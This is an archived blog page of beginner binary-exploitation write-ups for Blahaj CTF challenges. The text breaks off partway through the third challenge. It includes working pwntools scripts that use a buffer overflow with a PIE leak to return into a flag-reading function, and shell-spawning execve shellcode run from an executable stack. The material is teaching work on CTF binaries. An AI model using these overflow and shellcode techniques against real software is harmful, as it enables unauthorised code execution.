["https://archive.elmo.sg/posts/ctfs/2023/blahaj-ctf"]
title = "Blahaj CTF Pwn Writeups | a rant of my adventures"
description = "pwn challenges from blahaj ctf"
full_description = '''Blahaj CTF Pwn Writeups3 Dec 2023Table of ContentsCARSAnalyzing the programBlack-Box analysisLooking at the source codeUnderstanding how and what to ExploitOverflow what?Overflow how?ExploitFind our paddingFinal SolutionA small hiccup: MOVAPS issuewarpdriveAnalyzing the programSolving the challengeNotepadAnalyzing the programVulnerability AnalysisExploiting the Program: ret2libcThe Global Offset TableBack to leakingStage 1 ExploitGetting a shellFINALE: ChristmasAnalysisBrief OverviewAdding a Wish (malloc)Removing a Wish (free)View a WishHidden in PlainsightExploit StrategyArbitrary ReadArbitrary Write: Heap OverflowWhat next?SOLUTION 1: Most Straightforward Solution, using everything mentioned so farSummarySOLUTION 2: Solve without using the heap overflow [intended solution]SummarySOLUTION 3: Solve without overwriting limitSummaryBlahaj CTF was an entry-level CTF that was targeted at secondary school and JC students in Singapore. Having not touched pwn for awhile, the pwn challenges were fun, refreshing and even challenging. There were a total of 4 pwn challenges, 3 simpler ones and 1 challenging one. The writeups for the 4 challenges are below and in increasing difficulty.This writeup aims to be dummy-friendly, and a good guide for absolute beginners to learn binary exploitation.CARSI’ve been playing around with this reporting system for “cyber affairs”, generating ticket after ticket in hopes of breaking it. I have a feeling that there’s a way to access the admin panel…Attachments: cars, cars.cAnalyzing the programIn order to exploit the program, we need to be able to understand the program and identify the vulnerability.Black-Box analysisWe can first run checksec and run the program to get a feel for the program’s functionality.➜ checksec ./cars # we will worry about this later! [*] './cars' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled ➜ ./cars Welcome to the Cyber Affairs Reporting System (CARS) Report number: #94190627913872 Please input your student ID: 123 Please describe the incident: asd The matter has been recorded and will be investigated. Thank you. As we can see, the program is straightforward and takes in two input, let’s move on to look at the source code to see what is going on behind the scenes.Looking at the source codeunsigned long report_number = 0; int main() { setup(); srand(0xb1adee); // this random seed is sooo drain report_number = rand(); printf("Welcome to the Cyber Affairs Reporting System (CARS)\n"); printf("Report number: #%lu\n", &report_number); file_report(); return 0; } As we can see, there is a global variable report_number.Global variables as such are usually stored in the bss data segment at a fixed offset within in a program’s memory space.In contrast, local variables are saved onto the stack, which is always random located due to ASLR (address space layout randomization).This report_number seems to be printed via the printf function, albeit in a weird way.Instead of printing the value report_number, the program prints &report_number which will print the address in memory where report_number resides.It then calls the file_report() function.void file_report() { char input[28]; printf("Please input your student ID: "); fgets(input, 28, stdin); printf("Please describe the incident: "); fgets(input, 256, stdin); printf("The matter has been recorded and will be investigated. Thank you.\n"); } In this function, the program takes two input via the fgets() function and into the input local variable.The input variable is defined to be a character variable of size 28. However, the second fgets() function attempts to read 256 characters into input. This results in a buffer overflow!Now that we have found the vulnerability, we can move on to planning our exploit.Understanding how and what to ExploitGiven a buffer overflow vulnerability, what can we do? Let’s first gain a deeper understanding into where our input is going, and what it will overflow into.Overflow what?top of stack ┌───────────────────────┐ │ │ input │ input[28] │ flows │ │ downwards ↓ ├───────────────────────┤ │ │ │ saved rbp │ │ │ ├───────────────────────┤ │ │ │ return address │ │ │ └───────────────────────┘ bottom of stack In order to understand this, we have to understand a few things.Every function has it’s own allocated stack space in memory.When function A calls function B, it will need to somehow keep track and remember where to resume execution when function B is returning to function A.as such, it saves the instruction pointer on the stack, which is the return address (or the address that function B will return to after it is done)and it saves the stack pointer on the stack, which points to the stack space of the caller function (function A)this allows function B to return to function A gracefullytldr, the important part to understand is that the return address shown in the stack above is the address of the instruction that the program will return to after it is done with the file_report function. (which is in main function, since main function called file_report)This, we are able to overflow into the return address, to get the program to return to anywhere that we want.Overflow how?If we look at the source code, we can spot one very interesting function:void admin() { // how did you even get here? FILE *fptr = fopen("flag", "r"); if (fptr == NULL) { printf("Cannot open flag\n"); exit(0); } char c; while ((c = fgetc(fptr)) != EOF) { printf("%c", c); } fclose(fptr); } This function seems like our goal, which will read and give us the flag.If we are able to overwrite our return address with the address of this function, we will be able to call this function and get the flag.However, do we know the address of the admin() function?If we look at the checksec output above, we note that the program has the Positional Independent Executable (PIE). This essentially means that the program is loaded at a random address everytime that it is executed, which means that we will not be able to determine the admin() function without an address leak.Thankfully, from the main() function, we saw that the program printed us the address of the report_number global variable. Let’s see how we can get this to work.➜ nm ./cars # ... truncated ... 000000000000128e T admin 0000000000004090 B report_number # ... truncated ... In the output shown above, we have the offset of the admin() function and the report_number variable from the base of where the executable is loaded in memory.Given the address of report_number, we can do the following:ADDRESS_OF_ADMIN = REPORT_NUMBER_ADDRESS - 0x4090 + 0x128E ExploitIn order to find the padding it takes to overwrite the return address, we can use a cyclic/de-brujin sequence to find our return address.Find our padding➜ cyclic -n8 100 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa ➜ gdb cars pwndbg> run Starting program: ./cars [Thread debugging using libthread_db enabled] Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". Welcome to the Cyber Affairs Reporting System (CARS) Report number: #93824992247952 Please input your student ID: a Please describe the incident: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa The matter has been recorded and will be investigated. Thank you. Program received signal SIGSEGV, Segmentation fault. 0x000055555555528d in file_report () at pie_rop.c:22 ... truncated ... ► 0x55555555528d <file_report+113> ret <0x6161616161616166> pwndbg> cyclic -n8 -l *(long*)rsp Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161) Found at offset 40 Final SolutionLet’s try to piece together our exploit in a single pwntools script.from pwn import * # run the program p = process("./cars") p.recvuntil(b"Report number: #") REPORT_NUMBER_ADDRESS = int(p.recvline()) ADDRESS_OF_ADMIN = REPORT_NUMBER_ADDRESS - 0x4090 + 0x128E # Please input your Student ID: p.sendline(b"id") # Please describe the incident: (vulnerable!!) payload = b"A"*40 # pad our return address payload += p64(ADDRESS_OF_ADMIN) p.sendline(payload) p.interactive() If we try to run this script,[+] Starting local process './cars': pid 1543708 [*] Switching to interactive mode Please input your student ID: Please describe the incident: The matter has been recorded and will be investigated. Thank you. [*] Got EOF while reading in interactive [*] Process './cars' stopped with exit code -11 (SIGSEGV) (pid 1543708) [*] Got EOF while sending in interactive it crashes with a SIGSEGV signal.A small hiccup: MOVAPS issueWe can add a line to debug our script.from pwn import * # run the program p = process("./cars") gdb.attach(p) # ATTACH OUR DEBUGGER p.recvuntil(b"Report number: #") REPORT_NUMBER_ADDRESS = int(p.recvline()) ADDRESS_OF_ADMIN = REPORT_NUMBER_ADDRESS - 0x4090 + 0x128E # Please input your Student ID: p.sendline(b"id") # Please describe the incident: (vulnerable!!) payload = b"A"*40 # pad our return address payload += p64(ADDRESS_OF_ADMIN) p.sendline(payload) p.interactive() In our GDB, we can do continue to continue the program until it crashes.pwndbg> continue Continuing. Program received signal SIGSEGV, Segmentation fault. [ REGISTERS / show-flags off / show-compact-regs off ] *RSP 0x7ffd7586b648 ◂— 0x0 [ DISASM / x86-64 / set emulate on ] ► 0x7f7cb895b4c0 <_int_malloc+2832> movaps xmmword ptr [rsp + 0x10], xmm1 As we can see, it crashes on a movaps instruction. If we look at the movaps instruction documentation, it mentionsWhen the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated.In this context, the operand is rsp + 0x10. This means that our rsp register has to be 16-byte aligned, but it is not (0x7ffd7586b648 % 0x10 != 0x0) – resulting in the crash.How can we fix this? We can simply add a single ret instruction to increment our RSP by 0x8 before we call admin().➜ ROPgadget --binary cars | grep " : ret$" 0x000000000000101a : ret Let’s update our solve script.from pwn import * # run the program p = process("./cars") p.recvuntil(b"Report number: #") REPORT_NUMBER_ADDRESS = int(p.recvline()) ELF_BASE = REPORT_NUMBER_ADDRESS - 0x4090 ADDRESS_OF_ADMIN = ELF_BASE + 0x128E RET_GADGET = ELF_BASE + 0x101A # Please input your Student ID: p.sendline(b"id") # Please describe the incident: (vulnerable!!) payload = b"A"*40 # pad our return address payload += p64(RET_GADGET) payload += p64(ADDRESS_OF_ADMIN) p.sendline(payload) p.interactive() ➜ python3 solve.py [+] Starting local process './cars': pid 1547936 [*] Switching to interactive mode Please input your student ID: Please describe the incident: The matter has been recorded and will be investigated. Thank you. blahaj{r0pp1n6_w17h_p13} [*] Got EOF while reading in interactive warpdrivewith the latest and greatest in blahajtech, you can now warp anywhere on the stack!Attachments: warpAnalyzing the program➜ checksec warp [*] './warp' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments We are not given with the source code. This means that we will have to throw it into a decompiler like IDA or ghidra.int __cdecl main(int argc, const char **argv, const char **envp) { void (*ptr)(void); // [rsp+8h] [rbp-38h] BYREF char input[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 canary; // [rsp+38h] [rbp-8h] canary = __readfsqword(0x28u); setbuf(stdout, 0LL); setbuf(stdin, 0LL); setbuf(stderr, 0LL); printf("CURRENT POSITION: %p\nWARP TO:", &ptr); fgets(input, 40, stdin); __isoc99_sscanf(input, "%p", &ptr); ptr(); return 0; } As we can see, the program has No eXecute (NX) protections disabled, and has Read-Write-eXecute (RWX) segments.This means that the stack is executable, which allows us to potentially put assembly code on the stack to be executed.As we can see, the program prints us a stack address, takes in an address as an input and execute code at our inputted address.Solving the challengeTrivially, with the NX protections disabled, we can simply put shellcode (assembly code that gives us a shell) on the stack, and then jump to it. We can do this using a sys_execve syscall.Refer to this syscall table, to see the arguments that we have to populate for a sys_execve syscall.SYS_EXECVERAX: 0x3bRDI: char* filenameRSI: char* argv[]RDX: char* envp[]Ultimately, we want to write assembly to do the following sys_execve(0x3b, "/bin/sh", 0, 0)# put our /bin/sh string on the stack mov rbx, 0x68732f6e69622f push rbx # move /bin/sh pointer to RDI mov rdi, rsp # populate argv and envp arguments xor esi, esi # RSI = 0 xor edx, edx # RDX = 0 # make our execve syscall mov ax, 0x3b syscall Finally, we can put all this in a pwntools script and solve the challenge.from pwn import * context.arch = "amd64" p = process("./warp") sc = asm(""" mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp xor esi, esi xor edx, edx mov ax, 0x3b syscall """) p.recvuntil(b"POSITION: ") stack_leak = int(p.recvline(), 16) p.sendline(hex(stack_leak + 8 + 15).encode() + b" " + sc) # 8+15 is padding to the shellcode p.interactive() ➜ python3 solve.py [+] Starting local process './warp': pid 1555153 [*] Switching to interactive mode WARP TO: $ cat flag.txt blahaj{a_w4Rp_Bl1P_&_A_jUmp} NotepadWhat kinda lousy notepad is this? Gonna go back to neovim…Attachments: notepad libcAnalyzing the program➜ checksec notepad [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ➜ ./notepad Enter your note: hi Received thanksbb ➜ ./notepad Enter your note:  Received Segmentation fault (core dumped) If we try running the program, we see that it takes a single input and ends. If we try passing a long string in the input, it crashes. This tells us that this program might once again be vulnerable to a buffer overflow attack.Let’s have a deeper look at the program by throwing it into IDA.int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char input[16]; // [rsp+0h] [rbp-30h] BYREF int size; // [rsp+10h] [rbp-20h] char *buf; // [rsp+18h] [rbp-18h] void *dest; // [rsp+20h] [rbp-10h] unsigned __int64 canary; // [rsp+28h] [rbp-8h] canary = __readfsqword(0x28u); setup(); size = 0x10; buf = (char *)malloc(0x100uLL); strcpy(buf, "thanksbb"); dest = input; puts("Enter your note: "); gets(input); puts("Received"); memcpy(dest, input, size); puts(buf); exit(0); } This program is straightforward. Let’s sum'''
